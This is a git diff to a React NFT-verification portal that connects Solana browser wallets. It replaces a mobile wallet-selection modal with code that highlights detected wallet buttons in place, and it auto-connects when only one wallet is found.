@@ -12,8 +12,6 @@ function App() {
   const [nftCount, setNftCount] = useState(0);
   const [verificationResult, setVerificationResult] = useState(null);
   const [welcomeMessage, setWelcomeMessage] = useState('Welcome to Meta Betties Private Key - Exclusive NFT Verification Portal');
-  const [availableWallets, setAvailableWallets] = useState([]);
-  const [showWalletSelection, setShowWalletSelection] = useState(false);
 
   const REACT_APP_API_URL = process.env.REACT_APP_API_URL || 'https://api-server-wcjc.onrender.com';
   const tgId = new URLSearchParams(window.location.search).get('tg_id');
@@ -61,103 +59,43 @@ function App() {
     // Wait a bit for wallet detection
     await new Promise(resolve => setTimeout(resolve, 1500));
 
-    // Check for available mobile wallets
+    // Try to auto-connect to available mobile wallets
     const mobileWallets = [
-      { 
-        name: 'Phantom', 
-        icon: '🟣',
-        check: () => window.solana?.isPhantom, 
-        connect: connectPhantom 
-      },
-      { 
-        name: 'Solflare', 
-        icon: '🟠',
-        check: () => typeof Solflare !== 'undefined', 
-        connect: connectSolflare 
-      },
-      { 
-        name: 'Backpack', 
-        icon: '🔵',
-        check: () => window.xnft?.solana, 
-        connect: connectBackpack 
-      },
-      { 
-        name: 'Slope', 
-        icon: '🟢',
-        check: () => window.slope, 
-        connect: connectSlope 
-      },
-      { 
-        name: 'Glow', 
-        icon: '🟡',
-        check: () => window.glow, 
-        connect: connectGlow 
-      },
-      { 
-        name: 'Clover', 
-        icon: '🟦',
-        check: () => window.clover_solana, 
-        connect: connectClover 
-      },
-      { 
-        name: 'Coinbase', 
-        icon: '🔵',
-        check: () => window.coinbaseWalletSolana, 
-        connect: connectCoinbase 
-      },
-      { 
-        name: 'Exodus', 
-        icon: '🟣',
-        check: () => window.exodus, 
-        connect: connectExodus 
-      },
-      { 
-        name: 'Brave', 
-        icon: '🦁',
-        check: () => window.braveSolana, 
-        connect: connectBrave 
-      },
-      { 
-        name: 'Torus', 
-        icon: '🌀',
-        check: () => window.torus, 
-        connect: connectTorus 
-      },
-      { 
-        name: 'Trust', 
-        icon: '🛡️',
-        check: () => window.trustwallet, 
-        connect: connectTrust 
-      },
-      { 
-        name: 'Zerion', 
-        icon: '💰',
-        check: () => window.zerionWallet, 
-        connect: connectZerion 
-      }
+      { name: 'Phantom', check: () => window.solana?.isPhantom, connect: connectPhantom, icon: '🟣' },
+      { name: 'Solflare', check: () => typeof Solflare !== 'undefined', connect: connectSolflare, icon: '🟠' },
+      { name: 'Backpack', check: () => window.xnft?.solana, connect: connectBackpack, icon: '🔵' },
+      { name: 'Slope', check: () => window.slope, connect: connectSlope, icon: '🟢' },
+      { name: 'Glow', check: () => window.glow, connect: connectGlow, icon: '🟡' },
+      { name: 'Clover', check: () => window.clover_solana, connect: connectClover, icon: '🟦' },
+      { name: 'Coinbase', check: () => window.coinbaseWalletSolana, connect: connectCoinbase, icon: '🔵' },
+      { name: 'Exodus', check: () => window.exodus, connect: connectExodus, icon: '🟣' },
+      { name: 'Brave', check: () => window.braveSolana, connect: connectBrave, icon: '🦁' },
+      { name: 'Torus', check: () => window.torus, connect: connectTorus, icon: '🌀' },
+      { name: 'Trust', check: () => window.trustwallet, connect: connectTrust, icon: '🛡️' },
+      { name: 'Zerion', check: () => window.zerionWallet, connect: connectZerion, icon: '💰' }
     ];
 
     // Find available wallets
-    const available = mobileWallets.filter(wallet => wallet.check());
-    setAvailableWallets(available);
+    const availableWallets = mobileWallets.filter(wallet => wallet.check());
+    
+    console.log(`Found ${availableWallets.length} available wallets:`, availableWallets.map(w => w.name));
 
-    console.log(`Found ${available.length} available wallets:`, available.map(w => w.name));
-
-    if (available.length === 0) {
+    if (availableWallets.length === 0) {
       console.log('No mobile wallet found');
       updateStatus('No mobile wallet detected. Please install a Solana wallet app.', 'error');
       return;
     }
 
-    if (available.length === 1) {
-      // Only one wallet available - auto-connect
-      console.log(`Only one wallet available (${available[0].name}), auto-connecting...`);
-      updateStatus(`Found ${available[0].name} wallet, connecting...`, 'info');
+    if (availableWallets.length === 1) {
+      // Only one wallet found - auto-connect
+      const wallet = availableWallets[0];
+      console.log(`Found single wallet: ${wallet.name}, auto-connecting...`);
+      updateStatus(`Found ${wallet.name} wallet, connecting...`, 'info');
       
       try {
-        await available[0].connect();
-        console.log(`${available[0].name} connected successfully`);
-        updateStatus(`${available[0].name} connected successfully!`, 'success');
+        await wallet.connect();
+        console.log(`${wallet.name} connected successfully`);
+        updateStatus(`${wallet.name} connected successfully!`, 'success');
         
         // Auto-verify after successful connection
         setTimeout(() => {
@@ -169,42 +107,52 @@ function App() {
         }, 2000);
         
       } catch (error) {
-        console.log(`${available[0].name} connection failed:`, error);
-        updateStatus(`${available[0].name} connection failed. Please try again.`, 'error');
+        console.log(`${wallet.name} connection failed:`, error);
+        updateStatus(`${wallet.name} connection failed. Please try again.`, 'error');
       }
     } else {
-      // Multiple wallets available - show selection
-      console.log(`Multiple wallets available (${available.length}), showing selection...`);
-      updateStatus(`Found ${available.length} wallets. Please select one to continue.`, 'info');
-      setShowWalletSelection(true);
+      // Multiple wallets found - show the same web interface but highlight available ones
+      console.log(`Found ${availableWallets.length} wallets, showing web interface with available wallets highlighted...`);
+      updateStatus(`Found ${availableWallets.length} wallets. Please select one from the options below:`, 'info');
+      
+      // Show the verification section with available wallets highlighted
+      showVerificationSection();
+      
+      // Highlight available wallets in the UI
+      highlightAvailableWallets(availableWallets);
     }
   };
 
-  // Handle wallet selection from mobile list
-  const handleWalletSelection = async (selectedWallet) => {
-    console.log(`User selected ${selectedWallet.name} wallet`);
-    updateStatus(`Connecting to ${selectedWallet.name}...`, 'info');
-    setShowWalletSelection(false);
-    
-    try {
-      await selectedWallet.connect();
-      console.log(`${selectedWallet.name} connected successfully`);
-      updateStatus(`${selectedWallet.name} connected successfully!`, 'success');
+  // Highlight available wallets in the web interface
+  const highlightAvailableWallets = (availableWallets) => {
+    // Add visual indicators to available wallet buttons
+    availableWallets.forEach(wallet => {
+      const walletName = wallet.name.toLowerCase();
+      const button = document.querySelector(`[onclick*="${walletName}"]`) || 
+                    document.querySelector(`[data-wallet="${walletName}"]`);
       
-      // Auto-verify after successful connection
-      setTimeout(() => {
-        if (userAddress) {
-          console.log('Auto-verifying NFT ownership...');
-          updateStatus('Auto-verifying NFT ownership...', 'info');
-          verifyNFT();
-        }
-      }, 2000);
-      
-    } catch (error) {
-      console.log(`${selectedWallet.name} connection failed:`, error);
-      updateStatus(`${selectedWallet.name} connection failed. Please try again.`, 'error');
-      setShowWalletSelection(true); // Show selection again
-    }
+      if (button) {
+        button.style.border = '2px solid #10b981';
+        button.style.boxShadow = '0 0 10px rgba(16, 185, 129, 0.3)';
+        button.style.position = 'relative';
+        
+        // Add "Available" badge
+        const badge = document.createElement('div');
+        badge.textContent = 'Available';
+        badge.style.cssText = `
+          position: absolute;
+          top: -8px;
+          right: -8px;
+          background: #10b981;
+          color: white;
+          padding: 2px 8px;
+          border-radius: 12px;
+          font-size: 10px;
+          font-weight: bold;
+        `;
+        button.appendChild(badge);
+      }
+    });
   };
 
   const connectPhantom = async () => {
@@ -780,50 +728,8 @@ function App() {
               </div>
             )}
 
-            {/* Wallet Selection Modal for Mobile */}
-            {showWalletSelection && (
-              <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 p-4">
-                <div className="backdrop-blur-xl bg-white/10 rounded-3xl p-8 shadow-2xl border border-white/20 max-w-md w-full">
-                  <div className="text-center mb-6">
-                    <div className="w-16 h-16 bg-gradient-to-br from-purple-500 to-pink-500 rounded-full flex items-center justify-center mx-auto mb-4">
-                      <span className="text-2xl">📱</span>
-                    </div>
-                    <h3 className="text-2xl font-bold text-white mb-2">Select Your Wallet</h3>
-                    <p className="text-gray-300">Choose your preferred wallet to connect</p>
-                  </div>
-                  
-                  <div className="space-y-3">
-                    {availableWallets.map((wallet, index) => (
-                      <button
-                        key={index}
-                        onClick={() => handleWalletSelection(wallet)}
-                        className="w-full group relative overflow-hidden bg-gradient-to-br from-purple-500/20 to-purple-600/20 hover:from-purple-500/30 hover:to-purple-600/30 rounded-2xl p-4 text-white transition-all duration-300 border border-purple-400/30 hover:border-purple-400/50 hover:scale-105 hover:shadow-xl hover:shadow-purple-500/25"
-                      >
-                        <div className="flex items-center space-x-4">
-                          <div className="w-12 h-12 bg-gradient-to-br from-purple-500 to-purple-600 rounded-xl flex items-center justify-center shadow-lg">
-                            <span className="text-2xl">{wallet.icon}</span>
-                          </div>
-                          <div className="text-left">
-                            <div className="font-bold text-lg">{wallet.name}</div>
-                            <div className="text-sm text-purple-300">Solana Wallet</div>
-                          </div>
-                        </div>
-                      </button>
-                    ))}
-                  </div>
-                  
-                  <button
-                    onClick={() => setShowWalletSelection(false)}
-                    className="w-full mt-6 bg-gradient-to-r from-gray-500 to-gray-600 hover:from-gray-600 hover:to-gray-700 text-white font-bold py-3 px-6 rounded-xl transition-all duration-300"
-                  >
-                    Cancel
-                  </button>
-                </div>
-              </div>
-            )}
-
             {/* Wallet Connection Section */}
-            {!showVerification && !showWalletSelection && (
+            {!showVerification && (
               <div className="space-y-6">
                 <div className="text-center">
                   <h3 className="text-2xl font-bold text-white mb-2">Choose Your Solana Wallet</h3>
